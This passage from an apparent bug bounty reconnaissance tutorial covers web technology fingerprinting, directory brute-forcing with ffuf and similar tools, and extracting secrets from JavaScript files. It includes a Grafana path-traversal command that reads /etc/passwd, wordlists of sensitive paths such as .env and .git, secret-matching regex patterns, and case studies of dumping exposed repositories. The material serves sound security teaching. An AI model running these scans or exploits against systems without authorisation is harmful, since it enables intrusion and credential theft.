  Title[Example Domain]
```

#### Advanced Usage

```bash
# Aggression level 3 (most detailed)
whatweb -a 3 https://example.com

# Levels explained:
# -a 1: Stealthy (only HTTP headers)
# -a 2: Moderate (some JavaScript parsing)
# -a 3: Aggressive (everything, may trigger WAF)
# -a 4: Heavy (very intrusive)

# Scan multiple URLs
whatweb -i urls.txt

# Verbose output
whatweb --log-verbose=detailed_tech.txt https://example.com

# JSON output
whatweb --log-json=tech_results.json https://example.com

# Search for specific technology
whatweb --search WordPress -i urls.txt
```

#### Practical Example

```bash
# Full scan of target
whatweb -a 3 https://target.com --log-verbose=target_tech.txt

# Example output:
https://target.com [200 OK]
  Apache[2.4.29]
  Country[GERMANY][DE]
  Email[admin@target.com,support@target.com]
  HTML5
  HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)]
  IP[185.199.108.153]
  JQuery[3.4.1]
  PHP[7.2.24]
  Script[text/javascript]
  Title[Target Company - Home]
  WordPress[5.4.2]
  X-Powered-By[PHP/7.2.24]
```

### 🛠️ Tool 3: httpx with Tech Detection

```bash
# httpx can detect technologies too
cat subdomains.txt | httpx -tech-detect -title -status-code

# Example output:
https://blog.target.com [200] [WordPress,PHP,Nginx] [Company Blog]
https://api.target.com [200] [Express,Node.js] [API v2]
https://admin.target.com [403] [Apache,PHP/5.6.40] [Access Denied]
                                        ^^^^^^^^^
                                        OLD VERSION!
```

### 🛠️ Tool 4: Nuclei Templates for Tech Detection

```bash
# Nuclei has technology-specific templates
nuclei -u https://target.com -t technologies/

# Detects and reports:
[tech-detect:wordpress] https://target.com (WordPress 5.8.1)
[tech-detect:apache] https://target.com (Apache 2.4.41)
[tech-detect:php] https://target.com (PHP 7.4.3)
```

### 🔍 Manual Detection Techniques

#### 1. HTTP Headers Analysis

```bash
curl -I https://target.com

# Look for these headers:
Server: nginx/1.18.0              ← Web server & version
X-Powered-By: PHP/7.4.3           ← Backend language & version
X-AspNet-Version: 4.0.30319       ← ASP.NET version
X-Generator: Drupal 8             ← CMS
X-Framework: Laravel              ← Framework
Via: 1.1 varnish                  ← Caching layer
```

#### 2. HTML Source Code Analysis

```html
<!-- View Page Source (Ctrl+U) -->

<!-- Generator meta tag -->
<meta name="generator" content="WordPress 5.8.1" />

<!-- Powered by comment -->
<!-- Powered by PrestaShop -->

<!-- CSS/JS paths reveal framework -->
<link rel="stylesheet" href="/wp-content/themes/..." /> ← WordPress
<script src="/sites/all/modules/..." ></script> ← Drupal
<link href="/skin/frontend/..." /> ← Magento
```

#### 3. URL Patterns

```
WordPress:  /wp-admin, /wp-content, /wp-includes
Drupal:     /node/, /user/, /sites/
Joomla:     /administrator, /components
Laravel:    /public/, /storage/
Django:     /admin/, /static/, /media/
Rails:      /assets/, /rails/
```

#### 4. Cookies Analysis

```bash
# Check cookies (F12 → Application → Cookies)

PHPSESSID=...           → PHP backend
JSESSIONID=...          → Java (Tomcat/JBoss)
connect.sid=...         → Express.js/Node.js
csrftoken=...           → Django
_rails_session=...      → Ruby on Rails
laravel_session=...     → Laravel
SSESS...=...            → Drupal
```

#### 5. Favicon Hash

```bash
# Some frameworks have unique favicons
python3 favfreak.py -u https://target.com

# Detects framework by favicon hash
# Grafana: -156835827
# Jenkins: 81586312
# Jira: -305179312
```

### 🎯 Technology → Vulnerability Mapping

#### High-Value Technology Findings

| Technology | Version Risk | What to Check |
|------------|-------------|---------------|
| **WordPress < 5.9** | High | Plugin vulnerabilities, theme issues |
| **Apache < 2.4.50** | Critical | Path traversal CVE-2021-41773 |
| **PHP < 7.4** | High | Multiple RCE CVEs |
| **Tomcat < 9.0** | High | Ghostcat, manager access |
| **Jenkins** | High | Script console access |
| **Grafana < 8.3** | Critical | Path traversal CVE-2021-43798 |
| **Drupal < 9.2** | Critical | Drupalgeddon vulnerabilities |
| **Elasticsearch < 7.14** | High | RCE via Log4j |
| **Django DEBUG=True** | Critical | Secret key exposure |

#### Quick CVE Search

```bash
# After finding technology + version:
searchsploit "Apache 2.4.29"
searchsploit "WordPress 5.4.2"
searchsploit "Tomcat 7.0.52"

# Online databases:
# https://nvd.nist.gov
# https://www.cvedetails.com
# https://www.exploit-db.com
```

### 💡 Practical Workflow

```bash
#!/bin/bash
# tech-detect.sh - Complete technology detection

TARGET="$1"
OUTPUT="tech_detection_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUTPUT

echo "[+] Running WhatWeb..."
whatweb -a 3 $TARGET --log-verbose=$OUTPUT/whatweb.txt

echo "[+] Running httpx..."
echo $TARGET | httpx -tech-detect -json -o $OUTPUT/httpx.json

echo "[+] Checking HTTP headers..."
curl -I $TARGET > $OUTPUT/headers.txt

echo "[+] Running Nuclei tech detection..."
nuclei -u $TARGET -t technologies/ -json -o $OUTPUT/nuclei.json

echo "[+] Parsing results..."
cat $OUTPUT/whatweb.txt | grep -E "WordPress|Drupal|Joomla|PHP|Apache|nginx"
cat $OUTPUT/httpx.json | jq -r '.tech'

echo "[+] Detection complete! Results in $OUTPUT/"
```

### 🏆 Case Study: Version Detection = Instant Bounty

```
Hunter: @zseano
Platform: Bugcrowd
Target: [Redacted Financial Services]
Bounty: $7,500

Discovery:
1. Used WhatWeb on staging subdomain
   whatweb -a 3 https://staging.target.com

2. Found:
   Grafana[7.5.7]

3. Searched CVE databases:
   "Grafana 7.5.7 vulnerability"

4. Found CVE-2021-43798:
   Directory Traversal allowing arbitrary file read

5. Exploited:
   curl --path-as-is https://staging.target.com/public/plugins/example/../../../../../../../../etc/passwd

6. Read:
   /etc/passwd
   /etc/shadow
   application config files
   database credentials

7. Reported: Critical - Arbitrary File Read via Outdated Grafana
   Bounty: $7,500

Time from detection to PoC: 15 minutes
Key: Exact version number + CVE database
```

### 🎓 Practice Exercise

```bash
# Exercise 1: Detect technologies on popular sites
whatweb github.com
whatweb facebook.com  
whatweb wordpress.org

# Exercise 2: Compare results
whatweb github.com -a 1 > github_level1.txt
whatweb github.com -a 3 > github_level3.txt
diff github_level1.txt github_level3.txt

# Exercise 3: JSON parsing
whatweb --log-json=results.json example.com
cat results.json | jq -r '.plugins | keys[]'

# Exercise 4: Build your own scanner
cat > my_tech_scan.sh << 'EOF'
#!/bin/bash
URL=$1
echo "=== HTTP Headers ==="
curl -sI $URL | grep -E "Server|X-Powered-By|X-Generator"
echo ""
echo "=== WhatWeb ==="
whatweb $URL -a 3 | grep -oP '\[\K[^\]]+' | head -10
echo ""
echo "=== httpx ==="
echo $URL | httpx -silent -tech-detect
EOF
chmod +x my_tech_scan.sh
./my_tech_scan.sh https://example.com
```

### 📊 Quick Reference

```bash
# Basic detection
whatweb https://target.com

# Detailed scan
whatweb -a 3 https://target.com

# Multiple targets
whatweb -i urls.txt --log-verbose=results.txt

# JSON output
whatweb --log-json=tech.json https://target.com

# httpx tech detection
echo "target.com" | httpx -tech-detect

# Manual header check
curl -I https://target.com | grep -E "Server|X-Powered-By"

# Nuclei templates
nuclei -u https://target.com -t technologies/
```

---

## Phase 4: Content Discovery

### 🎯 Objective

**Find hidden directories, files, and endpoints that aren't linked from the main site.**

### Why Content Discovery Wins Bounties

```
80% of critical bugs are found in:
├─ /admin panels (forgotten, weak auth)
├─ /backup files (.sql, .zip, .tar.gz)
├─ /.git repositories (source code exposure)
├─ /api endpoints (broken access control)
├─ /config files (.env, web.config, config.php)
└─ /debug pages (information disclosure)

These paths are NOT in sitemaps or robots.txt
You must BRUTEFORCE them
```

### Understanding Directory Bruteforcing

```
You request:
  https://target.com/admin          → 403 Forbidden
  https://target.com/administrator  → 404 Not Found
  https://target.com/panel          → 404 Not Found
  https://target.com/dashboard      → 200 OK ✓

Found hidden dashboard!
```

### 🛠️ Tool 1: ffuf (Fast Web Fuzzer)

#### Installation

```bash
go install github.com/ffuf/ffuf/v2@latest
```

#### Basic Concepts

```bash
# URL with FUZZ keyword:
https://target.com/FUZZ

# ffuf replaces FUZZ with words from wordlist:
https://target.com/admin
https://target.com/login
https://target.com/api
# ... thousands more
```

#### Wordlists Setup

```bash
# Download SecLists (essential wordlist collection)
git clone https://github.com/danielmiessler/SecLists.git ~/SecLists

# Key wordlists for web fuzzing:
~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt    # 220K words
~/SecLists/Discovery/Web-Content/raft-medium-directories.txt      # 30K words
~/SecLists/Discovery/Web-Content/common.txt                        # 4.6K words
~/SecLists/Discovery/Web-Content/big.txt                           # 20K words
```

#### Example 1: Basic Directory Fuzzing

```bash
ffuf -w ~/SecLists/Discovery/Web-Content/common.txt \
     -u https://target.com/FUZZ

# Output:
admin                   [Status: 403, Size: 1234, Words: 89]
login                   [Status: 200, Size: 5678, Words: 456]
api                     [Status: 301, Size: 0, Words: 0]
```

#### Example 2: Filter Results

```bash
# Only show specific status codes
ffuf -w wordlist.txt \
     -u https://target.com/FUZZ \
     -mc 200,301,302,403

# Explanation:
# -mc = match codes (only show these)
# Shows: 200 OK, 301 Moved, 302 Found, 403 Forbidden

# Hide specific status codes
ffuf -w wordlist.txt \
     -u https://target.com/FUZZ \
     -fc 404

# -fc = filter codes (hide these)
```

#### Example 3: Match by Response Size

```bash
# Hide responses with specific size (remove false positives)
ffuf -w wordlist.txt \
     -u https://target.com/FUZZ \
     -fs 4242

# -fs = filter size (hide responses of 4242 bytes)

# Hide multiple sizes
ffuf -w wordlist.txt \
     -u https://target.com/FUZZ \
     -fs 1234,5678,9999
```

#### Example 4: File Extension Fuzzing

```bash
# Add extensions to each word
ffuf -w wordlist.txt \
     -u https://target.com/FUZZ \
     -e .php,.html,.txt,.bak,.zip,.sql

# Tests:
# /admin
# /admin.php
# /admin.html
# /admin.txt
# /admin.bak
# /admin.zip
# /admin.sql
```

#### Example 5: Rate Limiting (CRITICAL!)

```bash
# Limit requests per second
ffuf -w wordlist.txt \
     -u https://target.com/FUZZ \
     -rate 50

# Limit concurrent threads
ffuf -w wordlist.txt \
     -u https://target.com/FUZZ \
     -t 10

# Both combined (recommended)
ffuf -w wordlist.txt \
     -u https://target.com/FUZZ \
     -rate 50 \
     -t 10
```

#### Example 6: Save Results

```bash
# Save to file
ffuf -w wordlist.txt \
     -u https://target.com/FUZZ \
     -o results.json

# HTML report
ffuf -w wordlist.txt \
     -u https://target.com/FUZZ \
     -o results.html \
     -of html
```

#### Example 7: Silent Mode (Clean Output)

```bash
# Only show results, no progress
ffuf -w wordlist.txt \
     -u https://target.com/FUZZ \
     -s

# Silent + save to file
ffuf -w wordlist.txt \
     -u https://target.com/FUZZ \
     -s \
     -o clean_results.txt
```

### 🛠️ Tool 2: dirsearch (Beginner-Friendly)

#### Installation

```bash
git clone https://github.com/maurosoria/dirsearch.git
cd dirsearch
pip3 install -r requirements.txt
```

#### Basic Usage

```bash
# Simple scan
python3 dirsearch.py -u https://target.com

# Specify extensions
python3 dirsearch.py -u https://target.com -e php,html,js,txt

# Custom wordlist
python3 dirsearch.py -u https://target.com -w /path/to/wordlist.txt

# Multiple URLs
python3 dirsearch.py -l urls.txt

# Exclude status codes
python3 dirsearch.py -u https://target.com -x 404,403

# Add delay (rate limiting)
python3 dirsearch.py -u https://target.com --delay 1
```

### 🛠️ Tool 3: feroxbuster (Recursive Scanner)

#### Installation

```bash
# Using cargo (Rust package manager)
cargo install feroxbuster

# Or download binary from GitHub releases
wget https://github.com/epi052/feroxbuster/releases/download/v2.10.0/feroxbuster_amd64.deb
sudo dpkg -i feroxbuster_amd64.deb
```

#### Usage

```bash
# Basic recursive scan
feroxbuster -u https://target.com -w wordlist.txt

# Limit recursion depth
feroxbuster -u https://target.com -w wordlist.txt -d 2

# How recursion works:
# Depth 1: https://target.com/admin → Found!
# Depth 2: https://target.com/admin/users → Found!
# Depth 3: https://target.com/admin/users/export → Found!

# Rate limiting
feroxbuster -u https://target.com -w wordlist.txt --rate-limit 50

# Filter by status
feroxbuster -u https://target.com -w wordlist.txt -C 404

# Quiet mode
feroxbuster -u https://target.com -w wordlist.txt -q
```

### 🛠️ Tool 4: gobuster (Fast & Simple)

#### Installation

```bash
go install github.com/OJ/gobuster/v3@latest
```

#### Usage

```bash
# Directory mode
gobuster dir -u https://target.com -w wordlist.txt

# Specify extensions
gobuster dir -u https://target.com -w wordlist.txt -x php,html,txt

# Show status codes
gobuster dir -u https://target.com -w wordlist.txt -s 200,204,301,302,307

# Quiet output
gobuster dir -u https://target.com -w wordlist.txt -q

# Save results
gobuster dir -u https://target.com -w wordlist.txt -o results.txt
```

### 🎯 High-Value Target Paths

#### Create Custom Wordlist

```bash
cat > high_priority_paths.txt << 'EOF'
# Admin Panels
admin
administrator
admin.php
admin-panel
adminpanel
admin_panel
admin/login
admin/dashboard
panel
dashboard
console
cpanel
plesk
phpmyadmin
pma
adminer
wp-admin

# API Endpoints
api
api/v1
api/v2
api/v3
rest
rest/v1
graphql
swagger
swagger-ui
swagger.json
openapi.json
api-docs

# Authentication
login
signin
signup
register
auth
oauth
sso

# Development
dev
development
staging
test
testing
debug
trace
phpinfo.php
info.php

# Backups & Configs
backup
backups
backup.zip
backup.sql
backup.tar.gz
db
database
dump.sql
config
config.php
configuration
.env
.git
.git/config
.git/HEAD
web.config
.htaccess
.htpasswd

# Monitoring & Admin
actuator
actuator/health
actuator/env
health
metrics
status
server-status
server-info

# File Management
upload
uploads
files
media
assets
images
documents

# Interesting Files
robots.txt
sitemap.xml
crossdomain.xml
clientaccesspolicy.xml
README.md
CHANGELOG
package.json
composer.json
.DS_Store
error_log
access_log
EOF
```

### 💡 Practical Workflow

#### Complete Directory Enumeration

```bash
#!/bin/bash
# dir-enum.sh - Complete directory enumeration

TARGET="$1"
OUTPUT="dirscan_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUTPUT

echo "[+] Phase 1: Quick scan with common paths..."
ffuf -w ~/SecLists/Discovery/Web-Content/common.txt \
     -u $TARGET/FUZZ \
     -mc 200,301,302,403 \
     -t 10 \
     -rate 30 \
     -o $OUTPUT/phase1_common.json \
     -s

echo "[+] Phase 2: Detailed scan with medium wordlist..."
ffuf -w ~/SecLists/Discovery/Web-Content/raft-medium-directories.txt \
     -u $TARGET/FUZZ \
     -mc 200,301,302,403 \
     -t 10 \
     -rate 50 \
     -o $OUTPUT/phase2_detailed.json \
     -s

echo "[+] Phase 3: Extension fuzzing on found paths..."
cat $OUTPUT/phase1_common.json | jq -r '.results[].url' | while read url; do
    ffuf -w ~/SecLists/Discovery/Web-Content/common.txt \
         -u $url.FUZZ \
         -e .php,.html,.txt,.bak,.zip \
         -mc 200 \
         -t 5 \
         -rate 20 \
         -s
done

echo "[+] Phase 4: Recursive scan on high-value paths..."
grep -E "(admin|api|dashboard|panel)" $OUTPUT/phase1_common.json | \
while read path; do
    feroxbuster -u $TARGET/$path \
                -w ~/SecLists/Discovery/Web-Content/common.txt \
                -d 2 \
                -rate-limit 30 \
                -q
done

echo "[+] Scan complete! Results in $OUTPUT/"
```

### 🏆 Case Study: .git Directory Exposure

```
Hunter: @EdOverflow
Platform: HackerOne
Target: [Redacted Tech Company]
Bounty: $20,000

Discovery:
1. Ran ffuf with custom wordlist
   ffuf -w custom_paths.txt -u https://staging.target.com/FUZZ

2. Found:
   .git [Status: 301]

3. Validated:
   curl https://staging.target.com/.git/config
   [core]
       repositoryformatversion = 0
       filemode = true

4. Dumped repository:
   git-dumper https://staging.target.com/.git dumped_repo/

5. Found in dumped code:
   ├─ AWS access keys (hardcoded)
   ├─ Database credentials
   ├─ API secrets
   ├─ Internal API documentation
   └─ Admin passwords (cleartext)

6. Impact:
   - Complete source code exposure
   - Cloud infrastructure access
   - Database access
   - Authentication bypass

7. Report: Critical - Git Repository Exposure
   Bounty: $20,000

Key: One hidden directory = Complete compromise
```

### 🏆 Case Study: Backup File Discovery

```
Hunter: @samwcyo  
Platform: Bugcrowd
Target: [Redacted E-commerce]
Bounty: $15,000

Process:
1. Extension fuzzing:
   ffuf -w paths.txt -u https://target.com/FUZZ -e .zip,.tar.gz,.sql,.bak

2. Found:
   /backup-2024-01-15.zip [Status: 200, Size: 524288000]

3. Downloaded:
   wget https://target.com/backup-2024-01-15.zip

4. Extracted:
   unzip backup-2024-01-15.zip
   
   Contents:
   ├─ database_dump.sql (500MB)
   ├─ user_data.csv (50,000 records)
   ├─ payment_logs.txt
   └─ api_keys.txt

5. Impact:
   - Full customer database
   - PII (names, emails, addresses, phone numbers)
   - Payment information
   - API credentials

6. Bounty: $15,000

Key: File extension fuzzing finds forgotten backups
```

### 🎓 Practice Exercise

```bash
# Exercise 1: Scan test site
ffuf -w ~/SecLists/Discovery/Web-Content/common.txt \
     -u http://testphp.vulnweb.com/FUZZ \
     -mc 200,403

# Exercise 2: Extension fuzzing
ffuf -w ~/SecLists/Discovery/Web-Content/common.txt \
     -u http://testphp.vulnweb.com/FUZZ \
     -e .php,.html,.txt \
     -mc 200

# Exercise 3: Create your own wordlist
cat > my_wordlist.txt << EOF
admin
login
api
backup
test
EOF

ffuf -w my_wordlist.txt -u http://testphp.vulnweb.com/FUZZ

# Exercise 4: Filter by size
ffuf -w ~/SecLists/Discovery/Web-Content/common.txt \
     -u http://testphp.vulnweb.com/FUZZ \
     -fs 1234
```

### ⚠️ Directory Enumeration Best Practices

```diff
+ DO:
  ✅ Start with small wordlists (common.txt)
  ✅ Use rate limiting (-rate 30-50)
  ✅ Filter 404 responses (-fc 404)
  ✅ Test during off-peak hours
  ✅ Save results to files
  ✅ Follow up on 403 Forbidden

- DON'T:
  ❌ Use massive wordlists on everything
  ❌ Run without rate limits
  ❌ Ignore WAF blocks
  ❌ Test without permission
  ❌ Scan production during peak hours
  ❌ Forget to document findings
```

### 📊 Quick Reference

```bash
# Basic ffuf
ffuf -w wordlist.txt -u https://target.com/FUZZ

# With extensions
ffuf -w wordlist.txt -u https://target.com/FUZZ -e .php,.html

# Rate limited
ffuf -w wordlist.txt -u https://target.com/FUZZ -rate 50 -t 10

# Filter 404
ffuf -w wordlist.txt -u https://target.com/FUZZ -fc 404

# Only show 200,403
ffuf -w wordlist.txt -u https://target.com/FUZZ -mc 200,403

# Save results
ffuf -w wordlist.txt -u https://target.com/FUZZ -o results.json

# Recursive scan (feroxbuster)
feroxbuster -u https://target.com -w wordlist.txt -d 2

# Simple scan (dirsearch)
python3 dirsearch.py -u https://target.com -e php,html
```

---

## Phase 5: JavaScript Analysis

### 🎯 Objective

**Extract secrets, API endpoints, and hidden functionality from JavaScript files.**

### Why JavaScript Files Are Gold Mines

```javascript
// Real examples from bug bounty findings:

// Example 1: API Keys (Critical)
const API_KEY = "sk_live_51H7cK2eZvKYlo2C9qK0z1x2y3z4a5b6c7d8e9";
const FIREBASE_CONFIG = {
  apiKey: "AIzaSyDOCAbC123dEf456GhI789jKl012-MnO3456",
  authDomain: "company-prod.firebaseapp.com"
};

// Example 2: Hidden Endpoints (High Value)
const endpoints = {
  admin: "https://internal-admin.company.com/api",
  debug: "https://staging-api.company.com/debug",
  legacy: "https://old.company.com/v1/users"
};

// Example 3: Logic Flaws (Medium)
function checkDiscount(code, amount) {
  if (code === "INTERNAL50") {
    return amount * 0.5; // 50% off!
  }
}

// Example 4: Comments with Secrets (Critical)
// TODO: Remove before production
// Admin password: SuperSecret123!
// Database: mysql://root:password@internal-db.company.com:3306
```

**One JavaScript file can contain:**
- 🔑 API keys and secrets
- 🌐 Internal/hidden URLs
- 📧 Email addresses
- 🔐 Authentication logic flaws
- 💾 Database connection strings
- 🗺️ Application architecture map

### 🔍 Finding JavaScript Files

#### Method 1: Browser Developer Tools

```
1. Visit target website
2. Press F12 (Developer Tools)
3. Go to "Sources" tab
4. Expand the domain tree
5. Look for .js files

Common locations:
├── /js/
├── /static/js/
├── /assets/js/
├── /dist/
├── /build/
└── /webpack/
```

#### Method 2: Automated Collection

```bash
# Tool 1: getJS
go install github.com/003random/getJS@latest

# Usage:
echo "https://target.com" | getJS

# Output:
https://target.com/static/js/main.bundle.js
https://target.com/static/js/vendor.js
https://target.com/assets/app.min.js
https://target.com/js/config.js

# Save to file:
echo "https://target.com" | getJS > js_files.txt
```

```bash
# Tool 2: waybackurls + filtering
echo "target.com" | waybackurls | grep "\.js$" | sort -u > js_files.txt

# Tool 3: gau (GetAllUrls)
echo "target.com" | gau | grep "\.js$" | sort -u > js_files.txt

# Tool 4: gospider
gospider -s https://target.com -d 2 --js -o gospider_output
```

#### Method 3: httpx JavaScript Discovery

```bash
# Find live subdomains and extract JS files
cat subdomains.txt | httpx -silent | subjs

# Or combine:
cat subdomains.txt | httpx -silent > live.txt
cat live.txt | while read url; do
  curl -s $url | grep -oP 'src="[^"]+\.js"' | cut -d'"' -f2
done | sort -u > all_js_files.txt
```

### 🛠️ Tool 1: LinkFinder (Endpoint Discovery)

#### Installation

```bash
git clone https://github.com/GerbenJavado/LinkFinder.git
cd LinkFinder
pip3 install -r requirements.txt
```

#### Basic Usage

```bash
# Analyze single JS file
python3 linkfinder.py -i https://target.com/static/js/app.js -o results.html

# Analyze entire domain
python3 linkfinder.py -i https://target.com -d -o endpoints.html

# Command-line output only
python3 linkfinder.py -i https://target.com/app.js -o cli

# Example output:
/api/v1/users
/api/v1/admin/settings
/api/v2/internal/debug
/dashboard/export
/admin/logs
```

#### Analyze Multiple Files

```bash
cat js_files.txt | while read js; do
  python3 linkfinder.py -i $js -o cli
done | sort -u > all_endpoints.txt
```

### 🛠️ Tool 2: SecretFinder (Extract Secrets)

#### Installation

```bash
git clone https://github.com/m4ll0k/SecretFinder.git
cd SecretFinder
pip3 install -r requirements.txt
```

#### Usage

```bash
# Scan single JS file
python3 SecretFinder.py -i https://target.com/app.js -o results.html

# CLI output
python3 SecretFinder.py -i https://target.com/app.js -o cli

# What it finds:
[+] AWS Access Key: AKIAIOSFODNN7EXAMPLE
[+] API Key: sk_live_51H7cK2eZvKYlo2C
[+] Google API Key: AIzaSyDOCAbC123dEf456
[+] Slack Token: xoxp-1234567890-1234567890
[+] Private Key: -----BEGIN RSA PRIVATE KEY-----
```

#### Bulk Scanning

```bash
cat js_files.txt | while read js; do
  echo "Scanning: $js"
  python3 SecretFinder.py -i $js -o cli >> secrets_found.txt
done

# Review findings
cat secrets_found.txt | grep -E "API|KEY|SECRET|TOKEN|PASSWORD"
```

### 🛠️ Tool 3: JSScanner (All-in-One)

```bash
# Install
git clone https://github.com/0x240x23elu/JSScanner.git
cd JSScanner
pip3 install -r requirements.txt

# Usage
python3 jsscanner.py -u https://target.com

# Features:
- Finds all JS files
- Extracts endpoints
- Finds secrets
- Identifies sensitive patterns
- Generates report
```

### 🔥 Manual Analysis Techniques

#### Technique 1: Beautify Minified JavaScript

```bash
# Problem: Minified JS is unreadable
var a="secret",b=function(){return fetch("https://api.internal.com")};

# Solution: Beautify it
npm install -g js-beautify

# Beautify file
curl -s https://target.com/app.min.js | js-beautify > readable.js

# Now you can read:
var apiSecret = "secret";
var callAPI = function() {
    return fetch("https://api.internal.com");
};
```

**Online alternatives:**
- https://beautifier.io/
- https://codebeautify.org/jsviewer

#### Technique 2: Search for Sensitive Patterns

```bash
# Download JS file
curl -s https://target.com/app.js > app.js

# Search for API keys
grep -Eo "(api[_-]?key|apikey|api[_-]?secret).{0,50}" app.js

# Search for AWS keys
grep -Eo "AKIA[0-9A-Z]{16}" app.js

# Search for URLs
grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" app.js

# Search for passwords
grep -Eo "(password|passwd|pwd).{0,50}" app.js

# Search for tokens
grep -Eo "(token|auth|bearer).{0,50}" app.js
```

#### Technique 3: Create Grep Pattern File

```bash
cat > js_patterns.txt << 'EOF'
api[_-]?key
api[_-]?secret
access[_-]?token
auth[_-]?token
secret[_-]?key
client[_-]?secret
aws[_-]?access
aws[_-]?secret
AKIA[0-9A-Z]{16}
AIza[0-9A-Za-z-_]{35}
sk_live_[0-9a-zA-Z]{24}
sk_test_[0-9a-zA-Z]{24}
xoxp-[0-9]{10}-[0-9]{10}
-----BEGIN
password
passwd
credentials
database
firebase
mongodb
mysql
postgres
internal
staging
debug
admin[_-]?password
root[_-]?password
EOF

# Search all JS files
cat js_files.txt | while read js; do
  echo "=== $js ==="
  curl -s $js | grep -iEf js_patterns.txt
done
```

#### Technique 4: Extract All URLs

```bash
# Download all JS files
cat js_files.txt | while read url; do
  filename=$(echo $url | md5sum | cut -d' ' -f1)
  curl -s $url > js_downloads/$filename.js
done

# Extract all URLs from all JS files
grep -rEo "(http|https)://[a-zA-Z0-9./?=_-]*" js_downloads/ | sort -u > extracted_urls.txt

# Check if URLs are alive
cat extracted_urls.txt | httpx -mc 200,403,401 > live_js_urls.txt
```

### 💡 Practical Workflow

#### Complete JavaScript Analysis Pipeline

```bash
#!/bin/bash
# js-recon.sh - Complete JavaScript reconnaissance

TARGET="$1"
OUTPUT="js_analysis_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUTPUT/{raw,beautified,endpoints,secrets,urls}

echo "[+] Phase 1: Collecting JavaScript files..."
echo $TARGET | waybackurls | grep "\.js$" | sort -u > $OUTPUT/js_files.txt
echo $TARGET | gau | grep "\.js$" | sort -u >> $OUTPUT/js_files.txt
cat $OUTPUT/js_files.txt | sort -u | httpx -mc 200 -silent > $OUTPUT/live_js.txt

echo "[+] Found $(wc -l < $OUTPUT/live_js.txt) live JavaScript files"

echo "[+] Phase 2: Downloading files..."
cat $OUTPUT/live_js.txt | while read url; do
    filename=$(echo $url | md5sum | cut -d' ' -f1)
    curl -s $url > $OUTPUT/raw/$filename.js
done

echo "[+] Phase 3: Beautifying minified files..."
for file in $OUTPUT/raw/*.js; do
    filename=$(basename $file)
    js-beautify $file > $OUTPUT/beautified/$filename
done

echo "[+] Phase 4: Extracting endpoints..."
cat $OUTPUT/live_js.txt | while read url; do
    python3 ~/tools/LinkFinder/linkfinder.py -i $url -o cli >> $OUTPUT/endpoints/all.txt
done
cat $OUTPUT/endpoints/all.txt | sort -u > $OUTPUT/endpoints/unique.txt

echo "[+] Phase 5: Finding secrets..."
cat $OUTPUT/live_js.txt | while read url; do
    python3 ~/tools/SecretFinder/SecretFinder.py -i $url -o cli >> $OUTPUT/secrets/all.txt
done

echo "[+] Phase 6: Extracting URLs..."
grep -rEo "(http|https)://[a-zA-Z0-9./?=_-]*" $OUTPUT/beautified/ | \
    cut -d':' -f2- | sort -u > $OUTPUT/urls/extracted.txt
cat $OUTPUT/urls/extracted.txt | httpx -mc 200,403,401 -silent > $OUTPUT/urls/live.txt

echo "[+] Phase 7: Pattern matching..."
cat > $OUTPUT/patterns.txt << 'PATTERNS'
api[_-]?key
AKIA[0-9A-Z]{16}
AIza[0-9A-Za-z-_]{35}
password
secret
token
internal
admin
database
PATTERNS

grep -rEif $OUTPUT/patterns.txt $OUTPUT/beautified/ > $OUTPUT/secrets/patterns_found.txt

echo "[+] Analysis complete!"
echo "    JavaScript files: $(wc -l < $OUTPUT/live_js.txt)"
echo "    Endpoints found: $(wc -l < $OUTPUT/endpoints/unique.txt)"
echo "    URLs extracted: $(wc -l < $OUTPUT/urls/extracted.txt)"
echo "    Live URLs: $(wc -l < $OUTPUT/urls/live.txt)"
echo ""
echo "    Review:"
echo "    - Endpoints: $OUTPUT/endpoints/unique.txt"
echo "    - Secrets: $OUTPUT/secrets/all.txt"
echo "    - Pattern matches: $OUTPUT/secrets/patterns_found.txt"
echo "    - Live URLs: $OUTPUT/urls/live.txt"
```

### 🏆 Case Study: Firebase API Key Exposure

```
Hunter: @ngalog
Platform: HackerOne
Target: [Redacted Mobile App Company]
Bounty: $12,500

Discovery Process:

1. Collected JavaScript files:
   echo "target.com" | waybackurls | grep "\.js$" > js_files.txt

2. Downloaded main application JS:
   curl https://target.com/static/js/main.js > main.js

3. Beautified it:
   js-beautify main.js > main_readable.js

4. Searched for "firebase":
   grep -i firebase main_readable.js

5. Found:
   const firebaseConfig = {
     apiKey: "AIzaSyDOCAbC123dEf456GhI789jKl012-MnO3456",
     authDomain: "company-prod.firebaseapp.com",
     databaseURL: "https://company-prod.firebaseio.com",
     projectId: "company-prod",
     storageBucket: "company-prod.appspot.com"
   };

6. Tested API key:
   - Used Firebase REST API
   - Read /users collection
   - Found 50,000 user records with PII

7. Impact:
   - Full customer database access
   - PII exposure (names, emails, phone numbers)
   - No authentication required
   - Public API key in JavaScript

8. Report: Critical - Firebase Database Exposed via Client-Side API Key
   Bounty: $12,500

Key: Always check for firebase, aws, api_key in JavaScript
```

### 🏆 Case Study: Internal API Endpoints

```
Hunter: @rez0
Platform: Bugcrowd
Target: [Redacted SaaS Platform]
Bounty: $8,000

Process:

1. Used LinkFinder on main app.js:
   python3 linkfinder.py -i https://app.target.com/js/app.js -o cli

2. Found hidden endpoints:
   /api/v1/admin/users/export
   /api/v1/internal/debug/logs
   /api/v2/admin/settings

3. Tested endpoints:
   curl https://app.target.com/api/v1/admin/users/export

4. Response (no authentication required!):
   {
     "users": [
       {
         "id": 1,
         "email": "admin@company.com",
         "password_hash": "...",
         "role": "admin",
         "api_key": "..."
       },
       // ... 10,000 more users
     ]
   }

5. Also tested:
   curl https://app.target.com/api/v1/internal/debug/logs

6. Response:
   {
     "database_host": "prod-db-01.internal.company.com",
     "database_user": "root",
     "aws_region": "us-east-1",
     "s3_bucket": "company-private-data"
   }

7. Impact:
   - Full user database export (no auth)
   - Internal infrastructure disclosure
   - Credential exposure

8. Bounty: $8,000

Key: Endpoints in JS files often lack authentication
```

### 🎯 What to Look For in JavaScript

#### High-Priority Patterns

```javascript
// 1. API Keys
const API_KEY = "..."
apiKey: "..."
"api_key": "..."

// 2. Secrets
const SECRET = "..."
client_secret: "..."
auth_token: "..."

// 3. AWS Credentials
AWS_ACCESS_KEY_ID = "AKIA..."
AWS_SECRET_ACCESS_KEY = "..."

// 4. Internal URLs
const API_URL = "https://internal.company.com"
